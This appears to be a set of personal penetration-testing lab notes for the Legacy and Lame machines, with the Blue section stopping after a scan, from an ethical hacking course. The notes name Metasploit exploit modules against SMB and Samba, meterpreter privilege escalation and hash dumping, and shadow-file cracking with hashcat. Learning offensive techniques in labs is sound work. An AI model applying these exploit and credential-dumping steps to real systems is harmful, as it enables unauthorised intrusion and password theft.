
<head>      
    <link rel="stylesheet" href="css/retro.css">
</head>

## Misc Writeups
----
### Summary

All systems covered in the section 12 'Mid-Course Capstone' (https://www.udemy.com/course/practical-ethical-hacking/learn/lecture/17398048#content)

----
#### Walkthrough - Legacy (Windows XP)
* nmap -A -T4 -p- 10.10.10.4
    * 139/145 are open (SMB)
* smbclient -L \\\\10.01.10.4\\ 
    * no connection
* msfconsole
    * search smb_version
    * use auxiliary/scanner/smb/smb_version
        * options: set rhosts 10.10.10.4
        * run / exploit
* google 'smb windows xp sp3 exploit' 
    * https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
* msfconsole 
    * use exploit/windows/smb/ms08_067_netapi
        * options: set rhosts 10.10.10.4
        * run
    * meterpreter shell
        * getuid
        * route
        * ipconfig 
        * getsystem (priv escalation if not su)
        * hashdump (get be cracked offiline)
        * get CTFs     
---
####   Walkthrough - Lame (Ubuntu)
* nmap -A -T4 -p- 10.10.10.3
* scanning methods:
    * nmap (quick scan -> nmap -A -T4 -p- 10.10.10.3)
    * nmap (remove -A (speed killer). Then re-scan the specific ports only that have returned opened use hte -p switch)
* open ports
    * 21 FTP Anonymous Login allowed (the eploxit requires uploading a file and executinng a file)
    * 22 SSH (brute force or credentials gathering)
    * 139/445 netbios-ssn (SMB most likely )
    * 3632 distccd 
* smbclient -L \\\\10.01.10.3\\ 
    * Folder structure found!
* google: Samba 3.0.20-Debian (Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
    * https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script
* msfconsole 
    * msf > use exploit/multi/samba/usermap_script
        * options: set rhosts 10.10.10.3
        * run
    * meterpreter shell:
        * getuid (root)
        * getsystem (no priv escalation)
        * get CTFs  
* review: Cracking Linux Password Hashes with Hashcat - https://www.youtube.com/watch?v=eq097dEB8Sw&feature=youtu.be 
    * look at shadow file
    * unshadow shadow file
    * crack passwords with hashcat
---
####   Walkthrough - Blue 
* nmap -A -T4 -p- 10.10.10.40
---
